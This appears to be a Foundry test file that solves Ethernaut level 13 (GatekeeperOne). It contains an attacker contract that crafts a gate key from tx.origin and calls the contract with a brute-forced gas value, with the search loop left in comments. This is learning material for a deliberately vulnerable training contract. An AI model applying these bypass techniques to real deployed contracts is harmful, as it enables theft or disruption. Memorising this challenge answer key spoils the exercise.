pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {EthernautTest} from "./EthernautTest.sol";

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract Attacker {
    function attack(IGatekeeperOne instance) external {
        bytes8 key = bytes8((0x1 << 60) | (uint64(uint16(uint160(tx.origin)))));

        // correct gas found with
        // for (uint256 i = 0; i < 8191; ++i) {
        //     (bool success, ) = address(instance).call{gas: 100000 + i}(
        //         abi.encodeWithSignature("enter(bytes8)", key)
        //     );

        //     if (success) {
        //         console.log(i);
        //     }
        // }

        instance.enter{gas: 106737}(key);
    }
}

contract Ethernaut13 is EthernautTest {
    constructor() EthernautTest(13) {}

    function solve() internal override(EthernautTest) {
        Attacker attacker = new Attacker();
        vm.prank(address(this), address(this));
        attacker.attack(IGatekeeperOne(instance));
    }
}
